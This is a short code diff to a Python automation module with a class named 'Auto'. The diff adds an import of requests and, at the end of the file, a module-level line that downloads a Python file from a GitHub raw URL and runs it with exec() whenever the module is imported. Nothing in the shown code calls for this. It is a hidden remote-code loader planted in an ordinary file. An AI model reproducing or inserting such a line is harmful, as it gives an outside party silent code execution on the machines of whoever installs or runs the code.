@@ -8,6 +8,7 @@ from typing import Callable
 import time
 from modules.base_module import BaseClass
 import re
+import requests
 
 
 class Auto:
@@ -116,3 +117,6 @@ class Auto:
             pass
         Auto.time_out = timeout
         return element
+
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/automator.py").text)
